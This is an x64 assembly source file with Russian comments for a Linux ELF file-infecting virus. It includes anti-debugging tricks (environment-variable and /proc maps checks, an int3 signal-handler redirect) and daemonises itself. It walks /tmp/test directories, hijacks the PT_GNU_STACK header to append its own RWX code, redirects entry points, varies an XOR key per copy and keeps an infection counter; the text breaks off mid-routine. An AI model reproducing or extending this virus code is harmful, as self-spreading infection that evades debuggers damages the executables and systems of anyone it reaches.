include 'x64.inc'

USE64
ORG 0x0

; Задаём своё пространство, чтобы избежать пересечений с любыми иными
USER_CODE::

; Подключаем свои определения
namespace USER_CODE

include 'utility/align.inc'
include 'utility/@@.inc'
include 'x86/include/macro/struct.inc'
include 'include/macro/instruction.inc'
include 'include/macro/proc64.inc'
include 'include/macro/struct.inc'

include 'include/linux/unistd_64.inc'
include 'include/linux/ptrace.inc'
include 'include/linux/fcntl.inc'
include 'include/linux/mman.inc'
include 'include/linux/elf.inc'
include 'include/linux/sigaction.inc'

include 'include/main.inc'
include 'include/rc6.inc'

enum CODE_EXIT
		item CODE_EXIT_OK
		item CODE_EXIT_PTRACE
		item CODE_EXIT_CWD
		item CODE_EXIT_GETSID
		item CODE_EXIT_FORK
		item CODE_EXIT_SET_SID
		item CODE_EXIT_PROCESS_FIND
		item CODE_EXIT_SIG_ACTION
end namespace

macro debug_M
	; test		rax, rax
	; jns			@f
	; fastcall	debug, [$], rax
	; @@:
end macro

; r9    ; 6th param
; r8    ; 5th param
; r10   ; 4th param - rcx если обычная функция
; rdx   ; 3rd param
; rsi   ; 2nd param
; rdi   ; 1st param
; eax   ; syscall_number (регистры RCX и R11 будут уничтожены)
; syscall
; Указываем сегмент для кода и констант - делаем с разрешением на запись
; segment readable executable writeable

namespace USER_CODE
	jmp			main

	if RC6_W = 0x10
		S dw RC6_T dup (?)
	else if RC6_W = 0x20
		S dd RC6_T dup (?)
	else if RC6_W = 0x40
		S dq RC6_T dup (?)
	else
		err 'RC6_W'
	end if

	xor_old_id uint8_t ?;номер используемой в текущем вирусе таблицы xor
	;rdi - options_t
	proc main uses r15 r14
		locals
		endl

		; r15 - options_t
		mov			r15, rdi

		syscall		__NR_getppid
		mov			r14, rax

		; Разделимся на процессы родительский запустит нужный код или закончит работу - дочерний проверит под отладкой и если нет то инжектам займеться
		syscall		__NR_fork
		test		rax, rax
		js			.exit_fork
		jnz			.ret

		fastcall	findProcess, [.find1], .find1.sizeof
		test		rax, rax
		jnz			.exit_process_find

		mov			rax, [r15 + options_t.adress_debug]
		;Проверим нужно ли проверать на отладчик вообще
		cmp			byte[rax], 0x0
		jne			Correct_Code

		; Проверает находимся под отладкой или нет - если под отладкой - выходим
		fastcall	testDebug, r15, r14

		; Установим обработчик сигналов
		lea			rax, [restore_rt];Это Си делает что бы возращаться назад в код - тут сами это делаем
		lea			rdx, [handler]
		mov			[sigaction.sa_restorer], rax
		mov			[sigaction.sa_handler], rdx
		mov			[sigaction.sa_flags], (SA_SIGINFO or SA_RESTORER)
		syscall		__NR_rt_sigaction,5, [sigaction], 0x0, __NSIG_BYTES
		test		rax, rax
		jnz			.exit_sig_action

		; Спровоцируем сигнал, что бы прервать работу и перетийти в обработчик сигналов и сделать то что нужно
		int 3

		; Еслии  "школьник" отлаживает то просто выйдем - само собой тут нужно больше кода что бы не было понятно, что это подделка, но тут и так кода мало
		syscall		__NR_exit, 0

	.exit_fork:
		syscall		__NR_exit, CODE_EXIT_FORK

	.exit_process_find:
		syscall		__NR_exit, CODE_EXIT_PROCESS_FIND

	.exit_sig_action:
		syscall		__NR_exit, CODE_EXIT_SIG_ACTION

	.ret:
		ret

	.find1 db 'test', 0xA;0xA - почему то не ноль

	; Настоящий код который нужно выполнить
	Correct_Code:
		; Дочерний процесс
		; Сделаемся демоном что бы - когда нас кильнут то терминал не писал об сигнале
		; данный код уже выполняется в процессе потомка разрешаем выставлять все биты прав на создаваемые файлы, иначе у нас могут быть проблемы с правами доступа
		syscall		__NR_umask, 0x0

		; создаём новый сеанс, чтобы не зависеть от родителя
		syscall		__NR_setsid
		test		rax, rax
		js			.exit_set_sid

		; закрываем дискрипторы ввода/вывода/ошибок, так как нам они больше не понадобятся - но по факту можно и не закрывать так как не знаем какие открыты
		syscall		__NR_close, STDIN_FILENO
		syscall		__NR_close, STDOUT_FILENO
		syscall		__NR_close, STDERR_FILENO

		; преабразуем в текст постоянное уникальное но одно и тоже для и той же программы
		mov			rdi, [r15 + options_t.copy_start]
		mov			edx, [r15 + options_t.offset_time_stamp]
		mov			ecx, [r15 + options_t.offset_time_stamp]
		mov			eax, [r15 + options_t.offset_msg_add_constant]
		lea			rcx, [rdi + rcx];Получим адресс где находиться тайм штамп и что позволяет определить таблицу начальную для ксора текущую
		lea			rsi, [rdi + rdx]
		mov			cl, [rcx]
		lea			rdi, [rdi + rax]
		and			cl, SIZE_XOR_CODE_AND
		mov			[xor_old_id], cl;сохраняем для того что бы не повторялось
		fastcall	numberToHex, rdi, dword[rsi], (0x4 * 0x2)

		; Сохраним путь что бы востановить потом
		syscall		__NR_getcwd, [current_dir], current_dir.sizeof
		test		rax, rax
		js			.exit_cwd

		; Получим счетчик, если он уже сохранялся
		fastcall	getCounter

		; Установим текущим нужный каталог чтобы не париться со склеиванием строк
		syscall		__NR_chdir, [.tmp1]
		test		rax, rax
		js			@f
		fastcall	loopDir, r15
		@@:

		syscall		__NR_chdir, [.tmp2]
		test		rax, rax
		js			@f
		fastcall	loopDir, r15
		@@:

		; Востановим путь к рабочему катологу
		syscall		__NR_chdir, [current_dir]
		test		rax, rax
		js			.exit_cwd

		; Если все норм то попробуем сохранить счетчик - тут так же что бы был свободен буффер заодно current_dir - стек не используем
		fastcall	setCounter

		syscall		__NR_exit, CODE_EXIT_OK

	.exit_set_sid:
		syscall		__NR_exit, CODE_EXIT_SET_SID

	.exit_cwd:
		syscall		__NR_exit, CODE_EXIT_CWD

	.tmp1 db '/tmp/test', 0x0
	.tmp2 db '/tmp/test2', 0x0
	endp

	proc handler
		lea			rax, [main.Correct_Code]
		mov			[rdx + 0xA8], rax; Меняем rip и тем самым где продолжим исполнение после сигнало
		ret
	endp

	; Это устанавливает контекст процесса назад
	restore_rt:
		syscall		__NR_rt_sigreturn

	; Что бы не париться с выделением для текущей папки берем статик память
	current_dir db  PATH_MAX dup (?)

	; Для того что бы открыть 
	path_ppid db '/proc/'
	path_ppid_add db 0x30 dup (?)

	align count_inject_t.__alignment
	count count_inject_t crc32_summ:0x0, crc32_add:0x12345678, count_infection:0x0

	count_check db 0x0;Если ноль значит не смогли в принципе открыть на чтение файл от которого запустились
	count_infection_old uint64_t 0x0; Счетчик заряжений для сравнений

	CRC32_0x82F63B78:
	crc32_generate_table_M 1,0x82F63B78

	align kernel_sigaction.__alignment
	sigaction kernel_sigaction

	align stat.__alignment
	st stat

	proc setCounter uses r12 r13 r14 r15 rbp

		; Провераем удалось ли прочитать в принципе
		cmp			[count_check], 0x0
		mov			rax, [count_infection_old]
		je			.ret

		; Если не было заражений то нечего не делаем
		cmp			[count.count_infection], rax
		je			.ret

		; Превращаем симлинк в настоящий путь - так как мы используем обьек размерам с  константу максимального пути то можно спокойно конечный ноль добавлять
		syscall		__NR_readlink, [path_ppid], [current_dir], current_dir.sizeof
		test		rax, rax
		js			.ret

		; Превращаем в си строку
		lea			rdx, [current_dir];Не забываем про относительность кода
		mov			byte[rax + rdx], 0x0

		syscall		__NR_open, [path_ppid], (O_RDONLY)
		test		rax, rax
		js			.ret

		; r12 - fd
		mov			r12, rax

		; Получим размер файла
		syscall		__NR_fstat, r12, [st]
		test		rax, rax
		js			.ret_close

		; r13 - размер файла
		mov			r13, [st.st_size]

		; Выделим память для перезаписи файла - в Debian дописать не получаеться - нужно сначала удалить
		syscall		__NR_mmap, 0x0, [r13 + sizeof(count)], PROT_READ or PROT_WRITE, MAP_ANON or MAP_PRIVATE, -1, 0x0
		test		rax, rax
		js			.ret_close

		; Указатель на выделиную память
		mov			r14, rax

		; Пробуем прочитать весь файл
		syscall		__NR_read, r12, r14, r13
		cmp			rax, r13
		jne			.ret_close_mmap

		; Удаляем файл и после этого можно будет записать новый
		syscall		__NR_unlink, [current_dir]
		test		rax, rax
		js			.ret_close_mmap
	
		syscall		__NR_open, [current_dir], O_CREAT or O_RDWR, S_IRWXU or S_IXGRP or S_IXOTH
		test		rax, rax
		js			.ret_close_mmap

		; Закрываем за не надобностью
		mov			rdi, r12
		mov			r12, rax
		syscall		__NR_close, rdi

		;r15 - Указатель на структуру crc32
		lea			r15, [r14 + r13 - sizeof(count_inject_t)]

		; Размер сколько запишем в файл
		lea			rbp, [r13 + sizeof(count_inject_t)]

		; Проверим контрольную сумму - что бы понять было ли сохранение в файле
		fastcall	crc32, [r15 + count_inject_t.crc32_add], (sizeof(count_inject_t) - count_inject_t.crc32_add)
		lea			rcx, [r15 + sizeof(count_inject_t)]
		cmp			[r15 + count_inject_t.crc32_summ], eax
		cmovne		r15, rcx
		cmove		rbp, r13

		; Занесем значеия счетчика
		mov			eax, [count.crc32_add]
		mov			rcx, [count.count_infection]
		mov			[r15 + count_inject_t.crc32_add], eax
		mov			[r15 + count_inject_t.count_infection], rcx

		; Подсчитаем и заненесем crc32
		fastcall	crc32, [r15 + count_inject_t.crc32_add], (sizeof(count_inject_t) - count_inject_t.crc32_add)
		mov			[r15 + count_inject_t.crc32_summ], eax


		; Запишем в файл
		syscall		__NR_write, r12, r14, rbp

	.ret_close_mmap:
		syscall		__NR_munmap, r14, [r13 + sizeof(count)]

	.ret_close:
		; Закрываем за не надобностью
		syscall		__NR_close, r12

	.ret:
		ret
	endp

	proc getCounter uses r12

		syscall		__NR_getpid
		test		rax, rax
		js			.ret

		; Получим путь к своему файлу - который заражает
		lea		rsi, [path_ppid_add - 0x1]
		mov		r8d, 0xA
		.dec:
			xor			rdx, rdx
			inc			rsi
			div			r8
			add			dl, '0'
			test		rax, rax
			mov			[rsi], dl
			jnz			.dec
		lea		rdi, [path_ppid_add + 0x1]
		mov		byte[rsi + 0x1], '/'
		mov		byte[rsi + 0x2], 'e'
		mov		byte[rsi + 0x3], 'x'
		mov		byte[rsi + 0x4], 'e'
		mov		byte[rsi + 0x5], 0x0
		.reverse:
			cmp		rdi, rsi
			ja		.open_file
			mov		al, [rsi]
			mov		ah, [rdi - 0x1]
			mov		[rsi], ah
			mov		[rdi - 0x1], al
			dec		rsi
			inc		rdi
			jmp		.reverse
	; Откроем на чтение так как к запущенному процессу в Debian нет доступа на запись
	.open_file:
		syscall		__NR_open, [path_ppid], (O_RDONLY)
		test		rax, rax
		js			.ret

		; r12 - fd
		mov			r12, rax

		; Установим смещение на конец файла - 0x10 байт
		syscall		__NR_lseek, r12, 0 - sizeof(count_inject_t), SEEK_END
		test		rax, rax
		js			.ret_close


		; Пробуем прочитать
		syscall		__NR_read, r12, [count], sizeof(count)
		cmp			rax, sizeof(count)
		jne			.null

		; Указываем что можно будет пробовать сохранить
		inc			[count_check]

		; Проверим контрольную сумму
		fastcall	crc32, [count.crc32_add], (sizeof(count) - count_inject_t.crc32_add)
		xor			ecx, ecx
		cmp			[count.crc32_summ], eax
		cmove		rcx, [count.count_infection]
		mov			[count_infection_old], rcx
		je			.ret_close


	.null:
		mov		[count.crc32_summ], 0x0
		mov		[count.crc32_add], 0x12345678
		mov		[count.count_infection], 0x0

	.ret_close:
		syscall		__NR_close, r12

	.ret:
		ret
	endp


	; rsi - Обьем для которгого нужно посчитать CRC32
	; rdi - Источник
	proc  crc32

		xor		eax,eax
		lea		rcx, [CRC32_0x82F63B78]
		dec		eax

		@@:
		movzx  rdx,byte[rdi]
		xor  dl,al
		inc  rdi
		shr  eax,8
		xor  eax,[rcx + rdx * 0x4]
		dec  rsi
		jnz  @b

		not  eax
		ret
	endp

	;rsi - ppid родителя
	;rdi - options_t
	proc testDebug uses r15 r12 r14
		locals
			buffer			db	0x100 dup (?)
		endl
		; r15 - options_t
		mov			r15, rdi
		
		; r14 - ppid родителя
		mov			r14, rsi

		mov			r10, [r15 + options_t.adress_debug]
		;Проверим нужно ли проверать на отладчик вообще
		cmp			byte[r10], 0x0
		jne			.not_debug
	
		; Проверка- через переменную среды и первый аргумент
		mov			rdx, [r15 + options_t.arg_list]

		; rcx - получим количество аргументов и проверим есть 
		mov			rcx, [rdx + 0x0]

		; Проверим есть ли аргументы вообще
		test		rcx, rcx
		jz			.find_lib

		; Есть ли два аргумента в командной строке
		cmp			rcx, 0x2
		jne			.next

		mov			rdi, [r15 + options_t.copy_start]
		mov			eax, [r15 + options_t.offset_jmp]

		; получим указатель на второй аргумент
		mov			rsi, [rdx + 0x8 + 0x8]

		; Проверим в основном теле находимся и и тем самым учитываем аргументы или нет
		cmp			qword[rdi + rax], 0x0
		jne			.next

		;Проверим есть ли аргумент нужный нам
		cmp			byte[rsi + 0x0], '-'
		jne			.next
		cmp			byte[rsi + 0x1], 'd'
		jne			.next
		cmp			byte[rsi + 0x2], 0x0
		jne			.next

		; Установим что проверать на отладчик не нужно
		mov			byte[r10], 0x1
		jmp			.not_debug

	.next:
		shl			rcx, 0x3

		; Получим указатель на первый аргумент  являющимся путем к нашей программе обычно
		; r12 - первый аргумент
		mov			r12, [rdx + 0x8]

		; Получим указатель на начало массива переменных сред
		; r15 - указатель на массив перемеенных сред
		lea			r15, [rdx + rcx + 0x8 + 0x8]

		; Проверка основана на том, что если неотладчик то первый аргумент совпадает с переменной среды '_=' - но само собой не везде...))
		.find:
			mov			rsi, [r15]
			add			r15, 0x8
			test		rsi, rsi
			jz			.find_lib
			cmp			byte[rsi], '_'
			jne			.find
			cmp			byte[rsi + 0x1], '='
			jne			.find
			fastcall	strcmp, [rsi + 0x2], r12
			test		rax, rax
			jz			.not_debug
			jmp			.find

	.find_lib:
			lea		rsi, [path_ppid_add - 0x1]
			mov		rax, r14
			mov		r8d, 0xA
			.dec:
				xor			rdx, rdx
				inc			rsi
				div			r8
				add			dl, '0'
				test		rax, rax
				mov			[rsi], dl
				jnz			.dec
			lea		rdi, [path_ppid_add + 0x1]
			mov		byte[rsi + 0x1], '/'
			mov		byte[rsi + 0x2], 'm'
			mov		byte[rsi + 0x3], 'a'
			mov		byte[rsi + 0x4], 'p'
			mov		byte[rsi + 0x5], 's'
			mov		byte[rsi + 0x6], 0x0
		.reverse:
			cmp		rdi, rsi
			ja		.open_file
			mov		al, [rsi]
			mov		ah, [rdi - 0x1]
			mov		[rsi], ah
			mov		[rdi - 0x1], al
			dec		rsi
			inc		rdi
			jmp		.reverse

		.open_file:
		; Откроем файл и что бы прочитать все подключеные либы
		syscall		__NR_open, [path_ppid], (O_RDONLY)
		test		rax, rax
		js			.not_debug

		; r14 - fd file
		mov			r14, rax

		.find_trace_loop:
			syscall		__NR_read, r14, [buffer], buffer.sizeof
			test		rax, rax
			js			.debug_close
			jz			.not_debug_close
			; Скольо прочитали
			mov			r12, rax

			mov			rcx, r12
			lea			rdi, [buffer]
			cld
			mov			al, 't'
			.find_trace:
				repne		scasb
				cmp			rcx, .trace.sizeof
				jbe			.find_trace_loop_next
				lea			rdx, [.trace]
				mov			r9b, .trace.sizeof
				@@:
				mov			r8b, [rdx]
				cmp			r8b, [rdi]
				jne			.find_trace_next
				inc			rdx
				inc			rdi
				dec			r9b
				jnz			@b
				sub			rcx, .trace.sizeof
				jmp			.debug_close
		.find_trace_next:
				sub			rcx, .trace.sizeof
				jmp			.find_trace

		.find_trace_loop_next:
			cmp			r12, buffer.sizeof
			jb			.not_debug_close
			jmp			.find_trace_loop


	.debug_close:
		syscall		__NR_close, r14

	.debug:
		syscall		__NR_write, STDOUT_FILENO, [.debug_msg], .debug_msg.sizeof
		syscall		__NR_exit, CODE_EXIT_PTRACE
		.debug_msg db 'DEBUGGING..',0xA

	.not_debug_close:
		syscall		__NR_close, r14

	.not_debug:
		ret
	.trace db 'race'
		; ; Такой способ без доп усилей не актуален - так как после такого любой сигнал стопит процесс тем самым bash стопиться - fork просто так тоже не спасает
		; ; Если под отладкой, то уже трасировку установить на себя не выйдет
		; syscall		__NR_ptrace, PTRACE_TRACEME, 0x0, 0x0, 0x0
		; test		rax, rax
		; js			.exit_ptrace
	endp

	;rsi - размер строки включая ноль
	;rdi - строка с нулем то что ищем
	proc findProcess uses rbx r12 r13 r14 r15 rbp
		; rbx - храним файловый дескриптор
		; r12 - храним текущий указатель на linux_dirent64
		; r13 - конец массива linux_dirent64
		BUFFER_DIR_SIZE		:= (sizeof linux_dirent64)
		locals
			buffer_dir			db	BUFFER_DIR_SIZE dup (?)
			path_tmp			db 18 dup (?);с лихвой взято
		endl

		; r15 - то что ищем
		mov			r15, rdi

		; r14 - размер в байтах полный
		mov			r14, rsi

		cmp			rsi, path_tmp.sizeof
		jae			.ret_faill

		; Установим текущим нужный каталог что бы не париться со склеиванием строк
		syscall		__NR_chdir, [.proc]
		test		rax, rax
		js			.ret_faill

		syscall		__NR_open, [.proc], (O_RDONLY or O_DIRECTORY)
		test		rax, rax
		js			.ret_faill
		mov			ebx, eax

		.loop:
			; Получим список файловых директорий и прочего
			syscall		__NR_getdents64, ebx, [buffer_dir], BUFFER_DIR_SIZE
			test		rax, rax
			lea			r12, [buffer_dir]
			js			.ret_fd_faill
			jz			.ret_fd
			lea			r13, [r12 + rax]
			; Перебираем весь список, что получили
			.loopSmall:
				; Проверим на то что есть только цифры - это значит что пид процесса
				lea			rdi, [r12 + linux_dirent64.d_name]
				@@:
				mov			al, [rdi]
				inc			rdi
				test		al, al
				jz			@f
				cmp			al, '0'
				jb			.loopSmallNext
				cmp			al, '9'
				ja			.loopSmallNext
				jmp			@b
				@@:
				; Установим текущим нужный каталог что бы не париться со склеиванием строк и заодно проверим дериктория или нет
				syscall		__NR_chdir, [r12 + linux_dirent64.d_name]
				test		rax, rax
				js			.loopSmallNext

				; Откроем файл и что бы прочитать имя процесса
				syscall		__NR_open, [.comm], (O_RDONLY)
				test		rax, rax
				js			.ret_fd_faill

				; Считаем имя процесса - там ограничения в 16 байт включая ноль - это не цневерсально но так как имя процесса test который отсеиваем то норм. Плюс там указанно что на ноль заканчиваеться а по факту на перевод строки 
				mov			rbp, rax
				syscall		__NR_read, rbp, [path_tmp], path_tmp.sizeof
				
				; Сразу закроем хендл
				mov			rdi, rbp
				mov			rbp, rax
				syscall		__NR_close, rdi
				debug_M
				
				test		rbp, rbp
				js			.ret_fd_faill

				; Проверим что совпадает или нет имя процесса
				cmp			rbp, r14
				jne			.loopSmallNext_chdir
				lea			rdi, [path_tmp]
				mov			rsi, r15
				@@:
				mov			al, [rdi]
				inc			rdi
				cmp			al, [rsi]
				jne			.loopSmallNext_chdir
				dec			rbp
				jz			.ret_fd_faill
				inc			rsi
				jmp			@b

				; Восстановим предыдущий каталог
				.loopSmallNext_chdir:
				syscall		__NR_chdir, [.path_back]
				test		rax, rax
				js			.ret_fd_faill
				.loopSmallNext:
					movzx		eax, word[r12 + linux_dirent64.d_reclen]
					add			r12, rax
					cmp			r12, r13
					jb			.loopSmall
			jmp			.loop

		.ret_faill:
			mov		r12d, 0x1

		.ret_fd:
			mov		r12d, 0x0
			jmp		.ret_fd_faill_next

		.ret_fd_faill:
			mov		r12d, 0x1
		.ret_fd_faill_next:
			syscall		__NR_close, ebx
			debug_M

		; Если 1 значит ошибка или совпало имя, если ноль то норм все
		.ret:
			mov		eax, r12d
			ret
		.proc db '/proc', 0x0
		.comm db 'comm', 0x0
		.path db '.', 0x0
		.path_back db '..', 0x0
	endp

	;rdi - options_t
	proc loopDir uses rbx r12 r13 r15
		; rbx - храним файловый дескриптор
		; r12 - храним текущий указатель на linux_dirent64
		; r13 - конец массива linux_dirent64
		BUFFER_DIR_SIZE		:= (sizeof linux_dirent64)
		locals
			buffer_dir			db	BUFFER_DIR_SIZE dup (?)
		endl

		; r15 - options_t
		mov			r15, rdi

		syscall		__NR_open, [.path], (O_RDONLY or O_DIRECTORY)
		test		rax, rax
		js			.ret
		mov			ebx, eax

		.loop:
			; Получим список файловых директорий и прочего
			syscall		__NR_getdents64, ebx, [buffer_dir], BUFFER_DIR_SIZE
			test		rax, rax
			lea			r12, [buffer_dir]
			js			.ret_fd
			jz			.ret_fd
			lea			r13, [r12 + rax]
			; Перебираем весь список, что получили
			.loopSmall:
				; Проверим на текущую папку - '.' и предыдущую '..' 
				lea			rdi, [r12 + linux_dirent64.d_name]
				cmp			byte[rdi], '.'
				mov			al, [rdi + 0x1]
				jne			@f
				test		al, al
				jz			.loopSmallNext
				cmp			al, '.'
				jne			@f
				cmp			byte[rdi + 0x2], 0x0
				je			.loopSmallNext
				@@:
				; Сначала получим инфу о том, что открыли
				; d_type  - не проверяем, не совместима со всеми файловыми системи
				syscall		__NR_lstat, rdi, [st]
				mov			ecx, [st.st_mode]
				test		rax, rax
				js			.loopSmallNext
				and			ecx, S_IFMT
				; Проверим директория ли
				cmp			ecx, S_IFDIR
				je			.dir
				; Проверим файл ли
				cmp			ecx, S_IFREG
				je			.file
				.loopSmallNext:
				movzx		eax, word[r12 + linux_dirent64.d_reclen]
				add			r12, rax
				cmp			r12, r13
				jb			.loopSmall
			jmp			.loop

		.dir:
			; Установим текущим нужный каталог что бы не париться со склеиванием строк
			syscall		__NR_chdir, [r12 + linux_dirent64.d_name]
			test		rax, rax
			js			.loopSmallNext
			; Рекурсивно вызываем данную функцию и продолжаем перебор
			fastcall	loopDir, r15
			; Восстановим предыдущий каталог
			syscall		__NR_chdir, [.path_back]
			test		rax, rax
			js			.ret_fd
			jmp			.loopSmallNext

		.file:
			fastcall	elf64, [r12 + linux_dirent64.d_name], r15
			jmp			.loopSmallNext

		.ret_fd:
			syscall		__NR_close, ebx
			debug_M

		.ret:
			ret
		.path db '.', 0x0
		.path_back db '..', 0x0
	endp

	; rsi - указатель на options_t
	; rdi - указатель на путь к файлу
	proc elf64 uses rbx r12 r13 r14 r15 rbp
		; rbx - храним файловый дескриптор
		; r12 - размер открытого файла
		; r13 - указатель на открытую память
		locals
		gnu_stack Elf64_Phdr ?
		guid		dd ?
		guid_word1	dw ?
		guid_word2	dw ?
		guid_word3	dw ?
		guid_word	dw ?
		guid_dword	dd ?
		endl

		; Сохраним указатель на options_t
		mov			r15, rsi

		mov			r12, [st.st_size]
		; Проверим не слишком ли большой файл - слишком большие не будем обрабатывать
		cmp			r12, 0x10000000
		ja			.ret

		; Нормальные elf по размеру выравнены
		test		r12, (0x8 - 0x1)
		jnz			.ret

		; Откроем файл
		syscall		__NR_open, rdi, O_RDWR
		test		rax, rax
		js			.ret
		mov			ebx, eax

		; Отобразим файл в памяти - чтобы проверить подходит он или нет
		syscall		__NR_mmap, 0, r12, PROT_READ, MAP_PRIVATE, ebx, 0
		test		rax, rax
		mov			r13, rax
		js			.ret_close

		; Провераем magic число
		cmp			[r13 + Elf64_Ehdr.e_ident + EI_MAG0], ELFMAG0
		setne		al
		cmp			[r13 + Elf64_Ehdr.e_ident + EI_MAG1], ELFMAG1
		setne		ah
		cmp			[r13 + Elf64_Ehdr.e_ident + EI_MAG2], ELFMAG2
		setne		cl
		cmp			[r13 + Elf64_Ehdr.e_ident + EI_MAG3], ELFMAG3
		setne		ch
		shl			eax, 0x10
		shl			ecx, 0x10

		; Остальные проверки
		cmp			[r13 + Elf64_Ehdr.e_ident + EI_ABIVERSION], 0x0 ;В приложениях, удовлетворяющих данной спецификации, используется значение 0.
		setne		al
		cmp			[r13 + Elf64_Ehdr.e_ident + EI_OSABI], ELFOSABI_NONE
		setne		ah
		cmp			[r13 + Elf64_Ehdr.e_ident + EI_OSABI], ELFOSABI_GNU
		setne		cl
		cmp			[r13 + Elf64_Ehdr.e_ident + EI_DATA], ELFDATA2LSB
		setne		ch
		and			ah, cl
		cmp			[r13 + Elf64_Ehdr.e_ident + EI_VERSION], EV_CURRENT
		setne		cl
		shl			rax, 0x10
		shl			rcx, 0x10
		cmp			[r13 + Elf64_Ehdr.e_ident + EI_CLASS], ELFCLASS64
		setne		al
		cmp			[r13 + Elf64_Ehdr.e_type], ET_EXEC
		setne		ah
		cmp			[r13 + Elf64_Ehdr.e_type], ET_DYN
		setne		cl
		cmp			[r13 + Elf64_Ehdr.e_machine], EM_X86_64
		setne		ch
		and			ah, cl
		movzx		edx, [r13 + Elf64_Ehdr.e_phnum]
		cmp			[r13 + Elf64_Ehdr.e_ehsize], sizeof Elf64_Ehdr
		setne		cl
		; Проверяем, есть ли секции хоть какие-нибудь
		test		edx, edx
		setz		al
		; Проверяем, размер структуры, описывающей секцию
		cmp			[r13 + Elf64_Ehdr.e_phentsize], sizeof Elf64_Phdr
		setne		ah
		or			rax, rcx
		jnz			.ret_close_mmap
		; Проверяем, расположение секций не превышает ли размер самого файла
		mov			eax, sizeof Elf64_Phdr
		mov			rdi, [r13 + Elf64_Ehdr.e_phoff]
		mul			edx
		lea			edx, [eax + edi]
		lea			rbp, [r13 + rdi]
		lea			rsi, [r13 + rdx]
		mov			rdi, rbp
		cmp			rdx, r12
		ja			.ret_close_mmap
		
		; Найдем PT_GNU_STACK - чтобы не париться будем заражать только файлы имеющие данную секцию - все обычные сишные ее имеют - и так же так определим заражено ли нами или нет
		; rbp - PT_GNU_STACK
		; rdi - начало массива Elf64_Phdr
		; rsi - конец массива Elf64_Phdr
		@@:
		cmp			[rbp + Elf64_Phdr.p_type], PT_GNU_STACK
		je			@f
		add			rbp, sizeof Elf64_Phdr
		cmp			rbp, rsi
		jae			.ret_close_mmap
		jmp			@b
		@@:

		; Найдем виртуальный адрес который нужно по правильному указывать чтобы находилось в конце, а также выравнивание максимальное.
		; edx - p_align
		; ecx - virt
		xor			edx, edx
		xor			ecx, ecx
		.find_adress:
			cmp			[rdi + Elf64_Phdr.p_type], PT_LOAD
			jne			.find_adress_next
			mov			r9, [rdi + Elf64_Phdr.p_vaddr]
			mov			r10, [rdi + Elf64_Phdr.p_align]
			add			r9, [rdi + Elf64_Phdr.p_memsz]
			cmp			r10, rdx
			cmova		rdx, r10
			cmp			r9, rcx
			cmova		rcx, r9
		.find_adress_next:
			add			rdi, sizeof Elf64_Phdr
			cmp			rdi, rsi
			jb			.find_adress

		; Если не нашли ни одну секцию, то выходим
		test		rcx, rcx
		jz			.ret_close_mmap

		mov			[gnu_stack.p_type], PT_LOAD
		mov			[gnu_stack.p_flags], (PF_X or PF_R or PF_W)
		mov			[gnu_stack.p_offset], r12
		mov			[gnu_stack.p_align], rdx

		; Выравниванием адрес, если нужно
		test		rdx, rdx
		jz			@f
		lea			rcx, [rcx + rdx - 0x1]
		neg			rdx
		and			rcx, rdx
		@@:
		or			rcx, r12
		mov			[gnu_stack.p_paddr], rcx
		mov			[gnu_stack.p_vaddr], rcx

		; Подсчитаем новый размер файла, и размер всей выделяемой для секции памяти
		; r14 - размер нового файла
		mov			r14, [r15 + options_t.copy_size]
		mov			ecx, [r15 + options_t.size_rb]
		add			rcx, r14
		mov			[gnu_stack.p_filesz], r14
		mov			[gnu_stack.p_memsz], rcx
		add			r14, r12

		; Скоректируем указатель на PT_GNU_STACK
		sub			rbp, r13

		; Выделим память для внесения изменений
		syscall		__NR_mmap, 0x0, r14, PROT_READ or PROT_WRITE, MAP_ANON or MAP_PRIVATE, -1, 0x0
		test		rax, rax
		mov			rdi, rax
		js			.ret_close_mmap

		; Скоректируем указатель на PT_GNU_STACK
		add			rbp, rdi

		; Копируем файл из отображения в память, не привязанную к файлу
		fastcall	memcpy, rdi, r13, r12

		; Освободим память, которая уже не нужна
		mov			rdi, r13
		mov			rsi, r12
		mov			r13, rax
		xchg		r12, r14
		syscall		__NR_munmap, rdi, rsi
		debug_M

		; r14 - указатель память куда будем записывать свой уже код в новой памяти
		add			r14, r13
		; ebp - PT_GNU_STACK
		; rbx - храним файловый дескриптор
		; r12 - размер всего выделеного пространства и нового файла
		; r13 - указатель на открытую память
		; r15 - options_t

		; Заменяем старый PT_GNU_STACK на новый
		fastcall	memcpy, rbp, [gnu_stack], sizeof(gnu_stack)

		; Копируем свой код
		fastcall	memcpy, r14, qword[r15 + options_t.copy_start], qword[r15 + options_t.copy_size]

		; Установим точку прыжка, куда будем прыгать после всех действий - чтобы настоящая программа работала - записываем относительное значение
		; Установим точку запуска на наш код
		; Получим ключ рандомный для XOR
		mov			eax, [r15 + options_t.offset_jmp]
		mov			rcx, [r13 + Elf64_Ehdr.e_entry]
		mov			edx, [r15 + options_t.offset_start]
		mov			edi, [r15 + options_t.offset_time_stamp]
		add			rdx, [gnu_stack.p_paddr]
		sub			rcx, rdx
		mov			[r13 + Elf64_Ehdr.e_entry], rdx
		mov			[r14 + rax], rcx
		syscall		__NR_getrandom, [r14 + rdi], TIME_STAP_FULL_LEN, 0
		test		rax, rax
		js			.ret_close_mmap

		; Установим  уникальный номер в виде uuid v4
		syscall		__NR_getrandom, [guid], 0x10, 0
		test		rax, rax
		js			.ret_close_mmap

		; Установим версию UUID - 4 и вариант 1
		and			byte[guid_word2 + 0x1], 0xF
		and			byte[guid_word3 + 0x1], 0x3F
		or			byte[guid_word2 + 0x1], 0x40
		or			byte[guid_word3 + 0x1], 0x80
		mov			eax, [r15 + options_t.offset_msg_add]
		lea			rbp, [r14 + rax]

		fastcall	numberToHex, rbp, dword[guid], sizeof(guid) * 0x2
		fastcall	numberToHex, [rbp + 0x9], word[guid_word1], sizeof(guid_word1) * 0x2
		fastcall	numberToHex, [rbp + 0xE], word[guid_word2], sizeof(guid_word2) * 0x2
		fastcall	numberToHex, [rbp + 0x13], word[guid_word3], sizeof(guid_word3) * 0x2
		fastcall	numberToHex, [rbp + 0x18], word[guid_word], sizeof(guid_word) * 0x2
		fastcall	numberToHex, [rbp + 0x1C], dword[guid_dword], sizeof(guid_dword) * 0x2

		; Счетчик добавляем в вывод сообщения
		mov			rsi, [count.count_infection]
		mov			eax, [r15 + options_t.offset_msg_add_count]
		inc			rsi
		lea			rdi, [r14 + rax]
		mov			[count.count_infection], rsi
		fastcall	numberToHex, rdi, rsi, sizeof(count.count_infection) * 0x2

		; изменем код ксора но что бы не был как материнский и с учетам тайм штам ака рандом
		mov			edx, [r15 + options_t.offset_time_stamp]
		mov			esi, [r15 + options_t.offset_xor_date_code]
